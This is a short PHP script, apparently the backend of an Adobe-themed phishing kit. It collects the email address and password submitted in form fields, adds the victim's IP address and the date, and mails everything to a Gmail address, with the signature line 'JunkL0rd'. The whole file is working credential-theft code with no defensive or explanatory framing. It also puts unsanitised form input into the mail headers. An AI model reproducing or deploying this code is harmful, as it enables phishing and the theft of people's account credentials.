<?

$adddate=date("D M d, Y g:i a");
$mesaegs ="php_info";$mesaegs ="@";
$ip = getenv("REMOTE_ADDR");
$mesaegs ="adobe";$mesaegs  ="";
$message .= "---------=ReZulT=---------\n";
$message .= "Email: ".$_POST['x1']."\n";
$message .= "Password: ".$_POST['x2']."\n";
$message .= "---------=IP Adress & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------=JunkL0rd---------\n";




$sent ="junklord9@gmail.com";




$subject = "Adobe | adobe";
$headers = "From: OnGod<OnGod>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}

?>